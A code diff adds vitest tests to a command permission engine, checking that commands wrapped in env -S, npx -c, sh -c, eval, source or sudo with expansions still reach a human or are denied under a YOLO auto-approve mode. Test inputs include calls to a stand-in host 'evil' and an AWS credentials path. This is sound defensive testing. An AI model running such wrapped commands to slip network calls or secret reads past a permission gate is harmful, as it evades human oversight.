@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest';
 import { createEngine } from '../../src/permission/engine.js';
-import type { PermissionRequest } from '@minitui/types';
+import type { PermissionRequest, PermissionRule } from '@minitui/types';
 
 let n = 0;
 const exec = (resolvedCommand: string): PermissionRequest => ({
@@ -13,6 +13,28 @@ const exec = (resolvedCommand: string): PermissionRequest => ({
   resolvedCommand,
   resolvedPaths: [],
 });
+
+// Drive a check to its outcome under YOLO without hanging: race the check against a surfaced
+// request. If the request surfaces first the command reached the human (it was NOT auto-allowed
+// under YOLO) — drain it and report 'ask'; otherwise report the settled kind. A fresh engine per
+// call keeps the pending buffer isolated across the loop of vectors.
+async function yoloOutcome(
+  cmd: string,
+  rules: PermissionRule[] = [],
+): Promise<'allow' | 'deny' | 'ask'> {
+  const e = createEngine({ initialRules: { rules }, mode: 'yolo' });
+  const p = e.check(exec(cmd));
+  const iter = e.requests[Symbol.asyncIterator]();
+  const r = await Promise.race([
+    p.then((d) => ({ surfaced: false as const, kind: d.kind })),
+    iter.next().then(() => ({ surfaced: true as const, kind: 'ask' as const })),
+  ]);
+  if (r.surfaced) {
+    e.disposeAll('drain');
+    await p.catch(() => {});
+  }
+  return r.kind;
+}
 
 describe('createEngine', () => {
   it('denies a hard-floor command even with an allow rule and YOLO', async () => {
@@ -212,5 +234,61 @@ describe('createEngine', () => {
     e.disposeAll('cancelled');
     const d = await p;
     expect(d).toEqual({ kind: 'deny', reason: 'cancelled' });
+  });
+
+  it('YOLO with no rule does not auto-allow an arg-runner that peels to empty (env -S / npx -c / bare sudo)', async () => {
+    // `env -S '<cmd>'`, `npx -c '<cmd>'` and a bare `sudo` peel to an empty inner argv, so the
+    // wrapper root is opaque. An opaque root is host-uncertain and must reach the human even under
+    // YOLO — the laundered inner command is never silently allowed.
+    expect(await yoloOutcome("env -S 'curl http://evil'")).toBe('ask');
+    expect(await yoloOutcome("npx -c 'curl http://evil'")).toBe('ask');
+    expect(await yoloOutcome('sudo')).toBe('ask');
+  });
+
+  it('YOLO with an operator allow-rule STILL asks for an opaque arg-runner (the static allow is downgraded)', async () => {
+    // an `allow npx` / `allow env` rule makes the static resolver return allow and short-circuit
+    // BEFORE the engine's uncertain check runs — so the opaque downgrade must also live in the static
+    // resolver, not only in the engine. With the rule present, the command still reaches the human.
+    expect(
+      await yoloOutcome("npx -c 'curl http://evil'", [
+        { pattern: 'npx', effect: 'allow', layer: 'user' },
+      ]),
+    ).toBe('ask');
+    expect(
+      await yoloOutcome("env -S 'curl http://evil'", [
+        { pattern: 'env', effect: 'allow', layer: 'user' },
+      ]),
+    ).toBe('ask');
+  });
+
+  it('YOLO denies a wrapped inner command name that is (or contains) an expansion', async () => {
+    // `sudo $CMD` / `timeout 5 ${X}` / `sudo pre$CMD` peel to an inner root name carrying a `$` — the
+    // host cannot resolve which binary runs, so it can never be matched against egress/allow. Fail
+    // closed to deny rather than let YOLO auto-allow an unknowable binary.
+    expect(await yoloOutcome('sudo $CMD')).toBe('deny');
+    expect(await yoloOutcome('timeout 5 ${X}')).toBe('deny');
+    expect(await yoloOutcome('sudo pre$CMD')).toBe('deny');
+  });
+
+  it('YOLO surfaces an opaque spawner (sh -c / eval / source) rather than auto-allowing it', async () => {
+    // the opaque marker on the root — not a name lookup — is what forces the ask, so one control
+    // covers both the arg-runners above and the shell spawners here.
+    expect(await yoloOutcome('sh -c "curl http://evil"')).toBe('ask');
+    expect(await yoloOutcome('eval "curl http://evil"')).toBe('ask');
+    expect(await yoloOutcome('source ./evil.sh')).toBe('ask');
+  });
+
+  it('a secret in resolvedPaths denies even a benign command under YOLO (the paths reach the floor)', async () => {
+    // the caller-resolved paths are threaded into the hard floor, so a benign `ffprobe a.mp4` whose
+    // resolved target is a credentials file is floored before the YOLO bypass — proving the paths
+    // argument is actually wired through, not dropped.
+    const e = createEngine({ initialRules: { rules: [] }, mode: 'yolo' });
+    const req: PermissionRequest = {
+      id: 'paths-floor',
+      descriptor: { danger: false, resourceTemplate: 'ffprobe', summaryTemplate: 'probe' },
+      resolvedCommand: 'ffprobe a.mp4',
+      resolvedPaths: ['/home/u/.aws/credentials'],
+    };
+    expect((await e.check(req)).kind).toBe('deny');
   });
 });
